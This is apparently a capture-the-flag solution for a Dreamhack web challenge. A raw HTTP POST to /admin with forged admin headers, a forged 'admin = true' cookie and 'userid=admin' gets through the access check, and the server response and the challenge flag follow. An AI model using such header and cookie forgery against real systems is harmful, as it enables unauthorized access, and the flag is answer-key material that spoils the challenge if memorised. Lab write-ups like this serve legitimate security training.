#Raw Socket Sender

#Send POST -> Socket Send

#Input -> /socket
'''
host: 0.0.0.0     port: 8000

POST /admin HTTP/1.1
Host: host1.dreamhack.games:18725
User-Agent: Admin Browser
DreamhackUser: admin
Cookie: admin = true
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userid=admin
'''

#Output
'''
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 36
Server: Werkzeug/1.0.1 Python/3.8.2
Date: Sat, 05 Feb 2022 14:23:46 GMT

DH{9bb7177b6267ff7288e24e06d8dd6df5}
'''

#Flag
'''
=========================================================
DH{9bb7177b6267ff7288e24e06d8dd6df5}
=========================================================
'''

